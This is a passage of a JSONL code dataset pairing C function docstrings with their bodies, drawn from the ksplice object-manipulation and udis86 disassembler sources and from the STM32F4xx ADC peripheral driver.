82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* Assumes symbol is global, aka only one symbol of that name */\n", "func_signal": "static asymbol *name_to_symbol(struct superbfd *sbfd, const char *name)", "code": "{\n\tif (name == NULL)\n\t\treturn NULL;\n\n\tasymbol **symp;\n\tfor (symp = sbfd->syms.data;\n\t     symp < sbfd->syms.data + sbfd->syms.size; symp++) {\n\t\tasymbol *sym = *symp;\n\t\tif (strcmp(name, sym->name) == 0 &&\n\t\t    ((sym->flags & BSF_GLOBAL) != 0 ||\n\t\t     bfd_is_und_section(sym->section)))\n\t\t\treturn sym;\n\t}\n\treturn NULL;\n}", "path": "objmanip.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * opr_cast() - Prints an operand cast.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \nopr_cast(struct ud* u, struct ud_operand* op)", "code": "{\n  switch(op->size) {\n\tcase 16 : case 32 :\n\t\tmkasm(u, \"*\");   break;\n\tdefault: break;\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\syn-att.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_a()- Decodes operands of the type seg:offset\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_a(struct ud* u, struct ud_operand *op)", "code": "{\n  if (u->opr_mode == 16) {  \n    /* seg16:off16 */\n    op->type = UD_OP_PTR;\n    op->size = 32;\n    op->lval.ptr.off = inp_uint16(u);\n    op->lval.ptr.seg = inp_uint16(u);\n  } else {\n    /* seg16:off32 */\n    op->type = UD_OP_PTR;\n    op->size = 48;\n    op->lval.ptr.off = inp_uint32(u);\n    op->lval.ptr.seg = inp_uint16(u);\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* Modified function from GNU Binutils objcopy.c */\n", "func_signal": "void setup_section(bfd *ibfd, asection *isection, void *obfdarg)", "code": "{\n\tstruct superbfd *isbfd = fetch_superbfd(ibfd);\n\tstruct supersect *ss = fetch_supersect(isbfd, isection);\n\tbfd *obfd = obfdarg;\n\tbfd_vma vma;\n\n\tif (!ss->keep)\n\t\treturn;\n\n\tasection *osection = bfd_make_section_anyway(obfd, ss->name);\n\tassert(osection != NULL);\n\n\tosection->userdata = ss;\n\tbfd_set_section_flags(obfd, osection, ss->flags);\n\tss->symbol = osection->symbol;\n\tassert(bfd_set_section_size(obfd, osection, ss->contents.size));\n\n\tvma = bfd_section_vma(ibfd, isection);\n\tassert(bfd_set_section_vma(obfd, osection, vma));\n\n\tosection->lma = isection->lma;\n\tassert(bfd_set_section_alignment(obfd, osection, ss->alignment));\n\tosection->entsize = ss->entsize;\n\tosection->output_section = osection;\n\tosection->output_offset = 0;\n\tisection->output_section = osection;\n\tisection->output_offset = 0;\n\treturn;\n}", "path": "objmanip.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * clear_insn() - clear instruction pointer \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static int clear_insn(register struct ud* u)", "code": "{\n  u->error     = 0;\n  u->pfx_seg   = 0;\n  u->pfx_opr   = 0;\n  u->pfx_adr   = 0;\n  u->pfx_lock  = 0;\n  u->pfx_repne = 0;\n  u->pfx_rep   = 0;\n  u->pfx_repe  = 0;\n  u->pfx_seg   = 0;\n  u->pfx_rex   = 0;\n  u->pfx_insn  = 0;\n  u->mnemonic  = UD_Inone;\n  u->itab_entry = NULL;\n\n  memset( &u->operand[ 0 ], 0, sizeof( struct ud_operand ) );\n  memset( &u->operand[ 1 ], 0, sizeof( struct ud_operand ) );\n  memset( &u->operand[ 2 ], 0, sizeof( struct ud_operand ) );\n \n  return 0;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* =============================================================================\n * ud_set_vendor() - Set vendor.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_vendor(struct ud* u, unsigned v)", "code": "{\n  switch(v) {\n\tcase UD_VENDOR_INTEL:\n\t\tu->vendor = v;\n\t\tbreak;\n\tcase UD_VENDOR_ANY:\n\t\tu->vendor = v;\n\t\tbreak;\n\tdefault:\n\t\tu->vendor = UD_VENDOR_AMD;\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\udis86.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_imm() - Decodes Immediate values.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_imm(struct ud* u, unsigned int s, struct ud_operand *op)", "code": "{\n  op->size = resolve_operand_size(u, s);\n  op->type = UD_OP_IMM;\n\n  switch (op->size) {\n    case  8: op->lval.sbyte = inp_uint8(u);   break;\n    case 16: op->lval.uword = inp_uint16(u);  break;\n    case 32: op->lval.udword = inp_uint32(u); break;\n    case 64: op->lval.uqword = inp_uint64(u); break;\n    default: return;\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/**\n  * @brief  Initializes the ADCx peripheral according to the specified parameters \n  *         in the ADC_InitStruct.\n  * @note   This function is used to configure the global features of the ADC ( \n  *         Resolution and Data Alignment), however, the rest of the configuration\n  *         parameters are specific to the regular channels group (scan mode \n  *         activation, continuous mode activation, External trigger source and \n  *         edge, number of conversion in the regular channels group sequencer).  \n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InitStruct: pointer to an ADC_InitTypeDef structure that contains\n  *         the configuration information for the specified ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_Init(ADC_TypeDef* ADCx, ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint8_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_RESOLUTION(ADC_InitStruct->ADC_Resolution)); \n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ScanConvMode));\n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ContinuousConvMode)); \n  assert_param(IS_ADC_EXT_TRIG_EDGE(ADC_InitStruct->ADC_ExternalTrigConvEdge)); \n  assert_param(IS_ADC_EXT_TRIG(ADC_InitStruct->ADC_ExternalTrigConv));    \n  assert_param(IS_ADC_DATA_ALIGN(ADC_InitStruct->ADC_DataAlign)); \n  assert_param(IS_ADC_REGULAR_LENGTH(ADC_InitStruct->ADC_NbrOfConversion));\n  \n  /*---------------------------- ADCx CR1 Configuration -----------------*/\n  /* Get the ADCx CR1 value */\n  tmpreg1 = ADCx->CR1;\n  \n  /* Clear RES and SCAN bits */\n  tmpreg1 &= CR1_CLEAR_MASK;\n  \n  /* Configure ADCx: scan conversion mode and resolution */\n  /* Set SCAN bit according to ADC_ScanConvMode value */\n  /* Set RES bit according to ADC_Resolution value */ \n  tmpreg1 |= (uint32_t)(((uint32_t)ADC_InitStruct->ADC_ScanConvMode << 8) | \\\n                                   ADC_InitStruct->ADC_Resolution);\n  /* Write to ADCx CR1 */\n  ADCx->CR1 = tmpreg1;\n  /*---------------------------- ADCx CR2 Configuration -----------------*/\n  /* Get the ADCx CR2 value */\n  tmpreg1 = ADCx->CR2;\n  \n  /* Clear CONT, ALIGN, EXTEN and EXTSEL bits */\n  tmpreg1 &= CR2_CLEAR_MASK;\n  \n  /* Configure ADCx: external trigger event and edge, data alignment and \n     continuous conversion mode */\n  /* Set ALIGN bit according to ADC_DataAlign value */\n  /* Set EXTEN bits according to ADC_ExternalTrigConvEdge value */ \n  /* Set EXTSEL bits according to ADC_ExternalTrigConv value */\n  /* Set CONT bit according to ADC_ContinuousConvMode value */\n  tmpreg1 |= (uint32_t)(ADC_InitStruct->ADC_DataAlign | \\\n                        ADC_InitStruct->ADC_ExternalTrigConv | \n                        ADC_InitStruct->ADC_ExternalTrigConvEdge | \\\n                        ((uint32_t)ADC_InitStruct->ADC_ContinuousConvMode << 1));\n                        \n  /* Write to ADCx CR2 */\n  ADCx->CR2 = tmpreg1;\n  /*---------------------------- ADCx SQR1 Configuration -----------------*/\n  /* Get the ADCx SQR1 value */\n  tmpreg1 = ADCx->SQR1;\n  \n  /* Clear L bits */\n  tmpreg1 &= SQR1_L_RESET;\n  \n  /* Configure ADCx: regular channel sequence length */\n  /* Set L bits according to ADC_NbrOfConversion value */\n  tmpreg2 |= (uint8_t)(ADC_InitStruct->ADC_NbrOfConversion - (uint8_t)1);\n  tmpreg1 |= ((uint32_t)tmpreg2 << 20);\n  \n  /* Write to ADCx SQR1 */\n  ADCx->SQR1 = tmpreg1;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode on regular group channel \n  *         for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode on \n  *         regular group channel.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC regular discontinuous mode */\n    ADCx->CR1 |= (uint32_t)ADC_CR1_DISCEN;\n  }\n  else\n  {\n    /* Disable the selected ADC regular discontinuous mode */\n    ADCx->CR1 &= (uint32_t)(~ADC_CR1_DISCEN);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Checks whether the specified ADC interrupt has occurred or not.\n  * @param  ADCx:   where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_IT: specifies the ADC interrupt source to check. \n  *          This parameter can be one of the following values:\n  *            @arg ADC_IT_EOC: End of conversion interrupt mask\n  *            @arg ADC_IT_AWD: Analog watchdog interrupt mask\n  *            @arg ADC_IT_JEOC: End of injected conversion interrupt mask\n  *            @arg ADC_IT_OVR: Overrun interrupt mask                        \n  * @retval The new state of ADC_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus ADC_GetITStatus(ADC_TypeDef* ADCx, uint16_t ADC_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  uint32_t itmask = 0, enablestatus = 0;\n\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_IT(ADC_IT));\n\n  /* Get the ADC IT index */\n  itmask = ADC_IT >> 8;\n\n  /* Get the ADC_IT enable bit status */\n  enablestatus = (ADCx->CR1 & ((uint32_t)0x01 << (uint8_t)ADC_IT)) ;\n\n  /* Check the status of the specified ADC interrupt */\n  if (((ADCx->SR & itmask) != (uint32_t)RESET) && enablestatus)\n  {\n    /* ADC_IT is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* ADC_IT is reset */\n    bitstatus = RESET;\n  }\n  /* Return the ADC_IT status */\n  return  bitstatus;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Gets the selected ADC Software start regular conversion Status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC software start conversion (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetSoftwareStartConvStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Check the status of SWSTART bit */\n  if ((ADCx->CR2 & ADC_CR2_SWSTART) != (uint32_t)RESET)\n  {\n    /* SWSTART bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* SWSTART bit is reset */\n    bitstatus = RESET;\n  }\n  \n  /* Return the SWSTART bit status */\n  return  bitstatus;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables the selected ADC software start conversion of the regular channels.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartConv(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Enable the selected ADC conversion for regular group */\n  ADCx->CR2 |= (uint32_t)ADC_CR2_SWSTART;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC automatic injected group \n  *         conversion after regular one.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC auto injected conversion\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_AutoInjectedConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC automatic injected group conversion */\n    ADCx->CR1 |= (uint32_t)ADC_CR1_JAUTO;\n  }\n  else\n  {\n    /* Disable the selected ADC automatic injected group conversion */\n    ADCx->CR1 &= (uint32_t)(~ADC_CR1_JAUTO);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the specified ADC peripheral.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the ADCx peripheral. \n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_Cmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Set the ADON bit to wake up the ADC from power down mode */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_ADON;\n  }\n  else\n  {\n    /* Disable the selected ADC peripheral */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_ADON);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Gets the selected ADC Software start injected conversion Status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC software start injected conversion (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetSoftwareStartInjectedConvCmdStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Check the status of JSWSTART bit */\n  if ((ADCx->CR2 & ADC_CR2_JSWSTART) != (uint32_t)RESET)\n  {\n    /* JSWSTART bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* JSWSTART bit is reset */\n    bitstatus = RESET;\n  }\n  /* Return the JSWSTART bit status */\n  return  bitstatus;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Checks whether the specified ADC flag is set or not.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_FLAG: specifies the flag to check. \n  *          This parameter can be one of the following values:\n  *            @arg ADC_FLAG_AWD: Analog watchdog flag\n  *            @arg ADC_FLAG_EOC: End of conversion flag\n  *            @arg ADC_FLAG_JEOC: End of injected group conversion flag\n  *            @arg ADC_FLAG_JSTRT: Start of injected group conversion flag\n  *            @arg ADC_FLAG_STRT: Start of regular group conversion flag\n  *            @arg ADC_FLAG_OVR: Overrun flag                                                 \n  * @retval The new state of ADC_FLAG (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetFlagStatus(ADC_TypeDef* ADCx, uint8_t ADC_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_GET_FLAG(ADC_FLAG));\n\n  /* Check the status of the specified ADC flag */\n  if ((ADCx->SR & ADC_FLAG) != (uint8_t)RESET)\n  {\n    /* ADC_FLAG is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* ADC_FLAG is reset */\n    bitstatus = RESET;\n  }\n  /* Return the ADC_FLAG status */\n  return  bitstatus;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the ADC continuous conversion mode \n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC continuous conversion mode\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_ContinuousModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC continuous conversion mode */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_CONT;\n  }\n  else\n  {\n    /* Disable the selected ADC continuous conversion mode */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_CONT);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables the selected ADC software start conversion of the injected channels.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartInjectedConv(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Enable the selected ADC conversion for injected group */\n  ADCx->CR2 |= (uint32_t)ADC_CR2_JSWSTART;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Configures the high and low thresholds of the analog watchdog.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  HighThreshold: the ADC analog watchdog High threshold value.\n  *          This parameter must be a 12-bit value.\n  * @param  LowThreshold:  the ADC analog watchdog Low threshold value.\n  *          This parameter must be a 12-bit value.\n  * @retval None\n  */\n", "func_signal": "void ADC_AnalogWatchdogThresholdsConfig(ADC_TypeDef* ADCx, uint16_t HighThreshold,\n                                        uint16_t LowThreshold)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_THRESHOLD(HighThreshold));\n  assert_param(IS_ADC_THRESHOLD(LowThreshold));\n  \n  /* Set the ADCx high threshold */\n  ADCx->HTR = HighThreshold;\n  \n  /* Set the ADCx low threshold */\n  ADCx->LTR = LowThreshold;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Clears the ADCx's interrupt pending bits.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_IT: specifies the ADC interrupt pending bit to clear.\n  *          This parameter can be one of the following values:\n  *            @arg ADC_IT_EOC: End of conversion interrupt mask\n  *            @arg ADC_IT_AWD: Analog watchdog interrupt mask\n  *            @arg ADC_IT_JEOC: End of injected conversion interrupt mask\n  *            @arg ADC_IT_OVR: Overrun interrupt mask                         \n  * @retval None\n  */\n", "func_signal": "void ADC_ClearITPendingBit(ADC_TypeDef* ADCx, uint16_t ADC_IT)", "code": "{\n  uint8_t itmask = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_IT(ADC_IT)); \n  /* Get the ADC IT index */\n  itmask = (uint8_t)(ADC_IT >> 8);\n  /* Clear the selected ADC interrupt pending bits */\n  ADCx->SR = ~(uint32_t)itmask;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode for injected group \n  *         channel for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode on injected\n  *         group channel.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedDiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC injected discontinuous mode */\n    ADCx->CR1 |= (uint32_t)ADC_CR1_JDISCEN;\n  }\n  else\n  {\n    /* Disable the selected ADC injected discontinuous mode */\n    ADCx->CR1 &= (uint32_t)(~ADC_CR1_JDISCEN);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Configures the sequencer length for injected channels\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  Length: The sequencer length. \n  *          This parameter must be a number between 1 to 4.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedSequencerLengthConfig(ADC_TypeDef* ADCx, uint8_t Length)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint32_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_LENGTH(Length));\n  \n  /* Get the old register value */\n  tmpreg1 = ADCx->JSQR;\n  \n  /* Clear the old injected sequence length JL bits */\n  tmpreg1 &= JSQR_JL_RESET;\n  \n  /* Set the injected sequence length JL bits */\n  tmpreg2 = Length - 1; \n  tmpreg1 |= tmpreg2 << 20;\n  \n  /* Store the new register value */\n  ADCx->JSQR = tmpreg1;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the EOC on each regular channel conversion\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC EOC flag rising\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_EOCOnEachRegularChannelCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC EOC rising on each regular channel conversion */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_EOCS;\n  }\n  else\n  {\n    /* Disable the selected ADC EOC rising on each regular channel conversion */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_EOCS);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Returns the ADC injected channel conversion result\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the converted ADC injected channel.\n  *          This parameter can be one of the following values:\n  *            @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *            @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *            @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *            @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetInjectedConversionValue(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel)", "code": "{\n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n\n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel + JDR_OFFSET;\n  \n  /* Returns the selected injected channel conversion data value */\n  return (uint16_t) (*(__IO uint32_t*)  tmp); \n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Enables or disables the ADC DMA request after last transfer (Single-ADC mode)  \n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC DMA request after last transfer.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DMARequestAfterLastTransferCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC DMA request after last transfer */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_DDS;\n  }\n  else\n  {\n    /* Disable the selected ADC DMA request after last transfer */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_DDS);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "/**\n  * @brief  Set the injected channels conversion value offset\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the ADC injected channel to set its offset. \n  *          This parameter can be one of the following values:\n  *            @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *            @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *            @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *            @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @param  Offset: the offset value for the selected ADC injected channel\n  *          This parameter must be a 12bit value.\n  * @retval None\n  */\n", "func_signal": "void ADC_SetInjectedOffset(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel, uint16_t Offset)", "code": "{\n    __IO uint32_t tmp = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n  assert_param(IS_ADC_OFFSET(Offset));\n  \n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel;\n  \n  /* Set the selected injected channel data offset */\n *(__IO uint32_t *) tmp = (uint32_t)Offset;\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
